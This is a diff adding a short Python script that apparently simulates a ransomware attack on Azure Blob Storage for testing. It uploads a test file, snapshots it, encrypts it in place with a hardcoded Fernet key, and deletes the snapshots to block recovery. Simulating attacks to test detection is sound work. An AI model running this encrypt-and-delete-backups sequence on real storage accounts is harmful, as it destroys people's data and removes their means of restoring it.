@@ -1,0 +1,47 @@
+from cryptography.fernet import Fernet
+from azure.storage.blob import BlobServiceClient
+from azure.core.exceptions import ResourceExistsError
+import base64
+
+# The type of authentication chosen is via the storage account key (as the storage account will be deleted, so it will be different next time)
+connection_string = "<Connection String>"
+service = BlobServiceClient.from_connection_string(conn_str=connection_string)
+
+# Create Container
+container_client = service.get_container_client("testcontainer")
+try:
+    print("Creating test container...")
+    container_client.create_container()
+except ResourceExistsError:
+    print('Container already existed, continuing...')
+
+print("Uploading file-to-encrypt...")
+# Upload plaintext blob to container
+blob_client = service.get_blob_client("testcontainer", "file-to-encrypt.txt")
+with open("file-to-encrypt.txt", "rb") as data:
+    blob_client.upload_blob(data, overwrite=True)
+print("File uploaded")
+
+# Create a snapshot of this blob
+print("Creating Snapshot...")
+blob_client.create_snapshot()
+print("Created Snapshot")
+
+print("Downloading and encrypting file...")
+# Get blob, encrypt, reupload
+plaintext = blob_client.download_blob().readall()
+symm_key = base64.urlsafe_b64encode(b"securaencryptionkeytodestruction")
+cipher_suite = Fernet(symm_key)
+
+print("Encrypted file. Reuploading...")
+
+blob_client.upload_blob(cipher_suite.encrypt(
+    plaintext), overwrite=True)
+
+# Delete snapshots for blob
+try:
+    print("Deleting Snapshots...")
+    blob_client.delete_blob(delete_snapshots="only")
+    print("Simulation completed")
+except Exception:
+    print('No snapshots found to be deleted')
